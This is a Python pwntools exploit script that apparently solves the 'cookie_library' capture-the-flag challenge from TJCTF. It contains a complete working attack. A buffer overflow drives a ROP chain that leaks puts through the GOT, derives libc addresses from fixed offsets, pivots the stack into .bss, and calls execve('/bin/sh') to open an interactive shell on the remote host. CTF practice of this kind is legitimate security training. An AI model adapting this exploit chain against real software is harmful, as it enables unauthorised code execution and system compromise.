from pwn import *

context.update(log_level = 'debug')
#p = process('cookie_library')
p = remote('p1.tjctf.org', 8010)
p.recvuntil('tasty?')

e = ELF('cookie_library')
addr_got_puts = e.got['puts']
addr_plt_puts = e.plt['puts']
addr_plt_gets = e.plt['gets']

#gadgets
addr_popRDI = 0x00400933
addr_popRSP = 0x0040092d #pop rsp r13 r14 r15 ret

#addr_bss = 0x601020
addr_bss = 0x601500

payload = 'a'*0x58 + p64(addr_popRDI) + p64(addr_got_puts) + p64(addr_plt_puts)
#write to bss to make it a stack.
payload += p64(addr_popRDI) + p64(addr_bss) + p64(addr_plt_gets) 
#pop rsp to point bss as a stack.
payload += p64(addr_popRSP) + p64(addr_bss)

p.sendline(payload)

_recv = p.recvrepeat(1)
start = _recv.find('anymore') + len('anymore\n')
addr_libc_puts = u64(_recv[start:start+8].replace('\x0a', '\x00').ljust(8, '\x00'))

offset_systemToPuts = 0x31580
offset_putsToBinsh = 0x1334da
offset_putsToExecve = 0x64470

addr_libc_execve = addr_libc_puts + offset_putsToExecve
addr_libc_system = addr_libc_puts - offset_systemToPuts
addr_libc_binsh = addr_libc_puts + offset_putsToBinsh

log.info('addr_libc_puts: ' + hex(addr_libc_puts))
log.info('addr_libc_system: ' + hex(addr_libc_system))
log.info('addr_libc_execve: ' + hex(addr_libc_execve))
log.info('addr_libc_binsh: ' + hex(addr_libc_binsh))


#write address of system in bss
#addr_pointer_binsh = addr_bss+8*6
addr_popRSI =  0x00400931 # pop rsi r15 ret

payload = p64(0)*3 # r13 r14 r15
payload += p64(addr_popRDI) + p64(addr_libc_binsh)
payload += p64(addr_popRSI) + p64(0)*2
payload += p64(addr_libc_execve) + p64(0)*4
#payload += p64(addr_libc_binsh)

p.sendline(payload)

p.interactive()








p.interactive()
